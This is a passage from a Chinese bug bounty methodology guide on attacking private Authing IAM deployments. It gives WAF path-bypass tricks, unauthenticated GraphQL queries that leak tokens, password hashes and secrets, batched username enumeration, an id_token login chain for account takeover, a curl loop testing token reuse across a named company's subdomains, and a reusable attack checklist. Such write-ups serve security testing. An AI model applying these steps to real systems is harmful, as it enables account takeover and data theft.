# 实战经验沉淀（SRC/Bug Bounty 已验证）

## 7. 实战经验沉淀（SRC/Bug Bounty 验证）

> 以下方法论均来自真实 SRC 提交并被厂商确认，按攻击场景分类。

### 7.1 WAF 绕过 — 路径规范化差异

**核心思路**：WAF 规则通常匹配精确路径，但后端服务器会自动规范化路径中的多余斜杠/点号。

```
已验证绕过手法：
├── 双斜杠: /graphql//v2  (WAF 匹配 /graphql/v2 失败，后端自动规范化)
├── 三斜杠: /graphql///v2
├── 点斜杠: /graphql/./v2
├── 大小写: /GraphQL/v2 (部分 WAF)
└── URL 编码: /graphql%2f/v2
```

**经验法则**：
- 阿里云 WAF / Cloudflare 等主流 WAF 大多不做路径规范化后再匹配
- 一旦发现绕过，**同域所有路径规则**可能都存在同样问题
- WAF 绕过本身可能只是低危，但它是解锁后续高危链的前置条件，应作为攻击链第一步记录

### 7.2 GraphQL 未授权攻击面（IAM/Authing 场景）

**攻击面发现流程**：

```
1. 探测 GraphQL 端点可达性（/graphql/v2, /graphql, /api/graphql）
2. 内省查询确认 schema（__schema { types { name fields { name } } }）
3. 识别高价值 Query/Mutation：
   ├── rbacGroupList     → 用户列表 + Token + 密码 Hash
   ├── QueryOIDCAppInfoByAppID → client_secret 泄露
   ├── userExist         → 用户枚举（布尔型）
   ├── sendVerifyEmail   → 邮件轰炸
   ├── checkLoginStatus  → Token 有效性验证
   └── users / usersWithCustomData → 用户详情
4. 逐个测试是否需要认证（大多数不需要！）
5. 组合链：信息泄露 → 凭据获取 → ATO
```

**GraphQL Alias 批量枚举技巧**：

```graphql
# 单次请求枚举 500 个用户名（无速率限制时极其高效）
{
  a0: userExist(userPoolId: "xxx", username: "admin")
  a1: userExist(userPoolId: "xxx", username: "root")
  a2: userExist(userPoolId: "xxx", username: "test")
  ...
  a499: userExist(userPoolId: "xxx", username: "user499")
}
# 响应: {"data":{"a0":true,"a1":true,"a2":false,...}}
# 理论速率: >30000 用户名/分钟
```

**关键字段危害分级**：

| 字段 | 危害等级 | 利用方式 |
|------|---------|---------|
| token (JWT id_token) | **严重** | 直接 ATO，POST 到 interaction 端点完成登录 |
| password (Hash) | **高** | 离线破解 → 密码复用攻击 |
| client_secret | **高** | Password Grant 暴力破解 / Token 伪造 |
| phone/email | **中** | 社工 / 定向钓鱼 / 账户枚举 |
| lastIP (内网) | **中** | 内网拓扑侦察 |
| tokenExpiredAt | **低** | 判断攻击窗口 |

### 7.3 OIDC/SSO 认证绕过 — id_token 直接登录

**核心发现**：Authing 私有化部署的 OIDC interaction 端点接受裸 id_token (JWT) 作为认证凭据。

**完整攻击链**：

```
1. 通过 GraphQL 未授权获取用户 id_token (JWT 格式)
2. 浏览器访问业务系统 → 触发 OIDC 流程 → 重定向到 SSO 登录页
3. 从登录页 URL 提取 interaction UUID:
   /login?finish_login_url=/interaction/oidc/{UUID}/login
4. POST token 到 interaction 端点完成认证:
   POST /interaction/oidc/{UUID}/login
   Content-Type: application/x-www-form-urlencoded
   body: token=eyJhbGciOiJIUzI1Ni...
5. SSO 签发 authorization code → 回调业务系统 → 登录成功
```

**关键约束（踩坑记录）**：
- **必须用 id_token (JWT)**，access_token (opaque) 会返回"无效 Token 值"
- **interaction 必须由业务系统发起**（BPM → SSO），手动构造的 interaction 会导致 state 校验失败
- **跨域限制**：自动化脚本需在禁用 CORS 的浏览器中执行（`--disable-web-security`）

**ATO 验证三要素**：
1. API 认证：`/api/v2/users/me` 返回 200 + 用户数据
2. Web 登录：浏览器 launchpad 显示用户身份 + 可访问业务系统列表
3. 跨域验证：同一 Token 在多个 `*.iam.xxx` 子域均认证成功

### 7.4 Token 跨域复用验证方法

**思路**：IAM 平台签发的 Token 如果 aud 未严格校验，可能在所有接入系统通用。

```bash
# 在不同子域依次测试同一 Token
for domain in sso.iam bpm.iam aidi.iam timesheet.iam jira.iam; do
  curl -s "https://${domain}.horizon.auto/api/v2/users/me" \
    -H "Authorization: Bearer <token>" \
    -H "x-authing-userpool-id: <pool_id>" \
    -o /dev/null -w "%{http_code} ${domain}\n"
done
# 200 = Token 在该域有效（严重：一次泄露 = 全平台沦陷）
```

### 7.5 信息泄露到 ATO 的组合链思维

**SRC 定级提升关键**：单一信息泄露可能只是中危，但组合利用可以提升到严重。

```
典型组合链模式：

信息泄露层（中危）:
├── GraphQL 未授权 → client_secret (报告2)
├── GraphQL 未授权 → 用户 Token (报告3)
└── GraphQL 未授权 → 用户枚举 (报告2)

武器化层（高危→严重）:
├── client_secret + password grant → 暴力破解
├── id_token + OIDC interaction → 直接 ATO (报告3)
└── Token + 跨域复用 → 全平台接管

证明层（确保定级）:
├── checkLoginStatus 验证 Token 有效
├── /api/v2/users/me 证明 API ATO
├── 浏览器 launchpad 截图证明 Web ATO
└── 列出所有可访问业务系统（扩大影响面）
```

**提交策略**：
- 信息泄露 + ATO 完整证明 → 合并为 1 个严重漏洞
- 同一根因（GraphQL 未授权）产生的多个独立利用 → 可拆分为多个报告（如邮件轰炸单独提）
- 每个报告都要附上完整的可复现 PoC + 截图

### 7.6 Authing 私有化部署通用攻击清单

基于本次测试经验，针对 Authing 私有化部署的系统化测试清单：

```
□ WAF 绕过测试（双斜杠/编码/大小写）
□ GraphQL 内省（确认 schema 暴露程度）
□ rbacGroupList → Token + Password Hash 泄露
□ QueryOIDCAppInfoByAppID → client_secret 泄露
□ userExist → 批量用户枚举（alias 技巧）
□ sendVerifyEmail/sendSMS → 邮件/短信轰炸
□ checkLoginStatus → Token 有效性验证
□ /api/v2/applications/{appId}/public-config → 应用配置无认证暴露
□ /oidc/token (password grant) → 配合 secret 暴力破解
□ /interaction/oidc/{UUID}/login → id_token 直接登录
□ Token 跨域复用（测试所有 *.iam.xxx 子域）
□ 密码 Hash 分析（MD5 无盐 → 秒级破解）
□ JWT 解码分析（iss/aud/exp → 判断影响范围和窗口）
```

### 7.7 SRC 报告写作方法论

**高分报告结构**：

```
1. 漏洞概要（一句话说清楚：WAF绕过+未授权+ATO）
2. 攻击链步骤（Step by Step，每步有请求+响应）
3. ATO 证明（API 200 + Web 登录截图 + 可访问系统列表）
4. 影响量化（X人受影响、Y个系统、Z条敏感数据）
5. 修复建议（P0/P1/P2 分级，具体到接口+字段）
```

**定级提升技巧**：
- 中危 → 高危：证明可以实际利用（不只是泄露，要证明能登录）
- 高危 → 严重：证明影响多人 + 多系统 + 零前置条件
- 关键数字要突出：15 个有效 Token、28 个密码 Hash、19 个业务系统、< 5 秒完成攻击

---
